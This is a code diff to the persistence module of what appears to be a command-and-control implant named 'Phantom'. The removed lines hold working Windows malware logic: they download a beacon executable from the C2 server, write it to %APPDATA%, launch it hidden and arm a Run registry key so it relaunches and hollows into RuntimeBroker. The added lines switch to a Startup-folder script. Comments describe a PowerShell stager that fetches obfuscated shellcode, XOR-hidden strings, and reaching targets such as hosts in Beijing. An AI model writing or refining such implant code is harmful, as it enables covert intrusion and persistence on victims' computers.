@@ -2,6 +2,7 @@
 
 #include "evasion.h"
 #include "network.h"
+#include "persistence_startup.h"
 #include <string>
 #include <vector>
 
@@ -22,15 +23,6 @@ namespace persistence {
 #ifdef _WIN32
 
 inline std::string establish_windows(const net::C2Config& cfg, const std::string& name) {
-    char appdata[MAX_PATH];
-    DWORD appdataLen = GetEnvironmentVariableA("APPDATA", appdata, sizeof(appdata));
-    if (appdataLen == 0 || appdataLen >= sizeof(appdata)) {
-        return std::string(XOR_DEC(XOR_STR("Error: %APPDATA% not available")));
-    }
-
-    std::string dir = std::string(appdata) + "\\Microsoft\\Phantom";
-    CreateDirectoryA(dir.c_str(), NULL);
-
     // ── Strategy 1: NO-DISK persistence (preferred) ────────────────────
     // The RunKey relaunches the compact PowerShell stager (embedded at
     // build time). At next logon: powershell downloads the XOR PIC from
@@ -55,80 +47,21 @@ inline std::string establish_windows(const net::C2Config& cfg, const std::string
     }
 #endif
 
-    // ── Strategy 2 (fallback): classic PE on disk + self-hollow ────────
-    std::string exePath = dir + "\\" + name + ".exe";
-
-    // Download full beacon PE from C2. The beacon id MUST travel with the
-    // request: the server authorises a payload fetch through the per-beacon
-    // download token derived from X-Beacon-Id, so omitting it returns 403
-    // (live defect 2026-10-19: persist wrote the 29-byte error body to disk
-    // as PhantomBeacon.exe and armed a RunKey pointing at it).
-    std::string payload = net::http_request(cfg,
-        XOR_WDEC(XOR_WSTR(L"GET")).c_str(),
-        XOR_WDEC(XOR_WSTR(L"/api/v1/payload")).c_str(), "", cfg.beacon_id);
-    // A payload fetch that comes back as an HTTP error page, a redirect body
-    // or an empty response must never be armed as an executable: verify the
-    // DOS/PE magic before anything touches the filesystem.
-    if (payload.size() < 4096 || payload[0] != 'M' || payload[1] != 'Z') {
-        return std::string("Error: Payload download rejected (") +
-            std::to_string(payload.size()) +
-            " bytes, not a PE) — refusing to arm persistence. Check that "
-            "the listener serves /api/v1/payload to this beacon's token.";
-    }
-
-    // Save beacon PE to disk
-    HANDLE hFile = CreateFileA(exePath.c_str(), GENERIC_WRITE, 0, NULL,
-                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        return std::string(XOR_DEC(XOR_STR("Error: Failed to write beacon to "))) + exePath;
-    }
-    DWORD written = 0;
-    WriteFile(hFile, payload.data(), (DWORD)payload.size(), &written, NULL);
-    CloseHandle(hFile);
-    if (written != payload.size()) {
-        DeleteFileA(exePath.c_str());
-        return std::string("Error: Short write to ") + exePath +
-            " — on-disk copy removed, persistence NOT armed.";
-    }
-
-    // Run it once to establish the hollowed child
-    std::string runCmd = std::string("\"") + exePath + "\"";
-    STARTUPINFOA si = { sizeof(si) };
-    PROCESS_INFORMATION pi = {};
-    if (CreateProcessA(NULL, &runCmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
-    }
-
-    // Create Run key so it starts on next login
-    HKEY hKey;
-    if (RegCreateKeyExA(HKEY_CURRENT_USER,
-            XOR_DEC(XOR_STR("Software\\Microsoft\\Windows\\CurrentVersion\\Run")).c_str(),
-            0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-        runCmd = std::string("\"") + exePath + "\"";
-        if (RegSetValueExA(hKey, name.c_str(), 0, REG_SZ,
-                (const BYTE*)runCmd.c_str(), (DWORD)runCmd.size() + 1) == ERROR_SUCCESS) {
-            RegCloseKey(hKey);
-            return std::string("Persist established: RunKey -> ") + runCmd
-                + XOR_DEC(XOR_STR("\nThe beacon PE is saved to disk. On next login it will self-hollow into RuntimeBroker.")).c_str();
-        }
-        RegCloseKey(hKey);
-        return std::string(XOR_DEC(XOR_STR("Error: Failed to set Registry value")));
-    }
-
-    return std::string(XOR_DEC(XOR_STR("Error: Failed to open/create Registry key")));
+    // Strategy 2: no-admin, no-PE Startup script.
+    // Like every pull-based persistence, this needs the target to reach
+    // C2_HOST at logon; a target behind NAT/firewall (e.g. Beijing) needs a
+    // public staging relay or a pre-staged deliverable, never 0.0.0.0.
+    return establish_windows_startup(cfg, name);
 }
 
 // ── Removal: undo exactly what establish_windows created ───────────────────
-// The report tells the client to clean up the IOC list; this is the supported
-// way to do it. Every path here is the SAME one establish_windows wrote: the
-// RunKey value name, and the %APPDATA%\Microsoft\Phantom copy from the
-// on-disk fallback. No C2 round-trip is involved (nothing to download).
+// Strategy 1 = RunKey value; strategy 2 = per-user Startup .cmd. The legacy
+// on-disk copy is still removed for hosts cleaned after an older build. No
+// C2 round-trip is involved (nothing to download).
 inline std::string remove_windows(const std::string& name) {
     std::string results;
 
-    // 1) Run key value — BOTH strategies use the same value name, so a single
-    //    delete removes the no-disk stager AND the on-disk clone.
+    // 1) Run key value (strategy 1)
     HKEY hKey = NULL;
     if (RegOpenKeyExA(HKEY_CURRENT_USER,
             XOR_DEC(XOR_STR("Software\\Microsoft\\Windows\\CurrentVersion\\Run")).c_str(),
@@ -138,10 +71,18 @@ inline std::string remove_windows(const std::string& name) {
         RegCloseKey(hKey);
     }
 
-    // 2) on-disk beacon copy (fallback strategy)
+    // 2) Startup script (strategy 2) and legacy on-disk copy
     char appdata[MAX_PATH];
     DWORD len = GetEnvironmentVariableA("APPDATA", appdata, sizeof(appdata));
     if (len > 0 && len < sizeof(appdata)) {
+        std::string startupDir = std::string(appdata) +
+            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
+        std::string lnk = startupDir + name + ".lnk";
+        if (DeleteFileA(lnk.c_str()) == TRUE)
+            results += "Removed Startup shortcut: " + lnk + "\n";
+        std::string cmd = startupDir + name + ".cmd";
+        if (DeleteFileA(cmd.c_str()) == TRUE)
+            results += "Removed Startup script: " + cmd + "\n";
         std::string dir = std::string(appdata) + "\\Microsoft\\Phantom";
         std::string exePath = dir + "\\" + name + ".exe";
         if (DeleteFileA(exePath.c_str()) == TRUE)
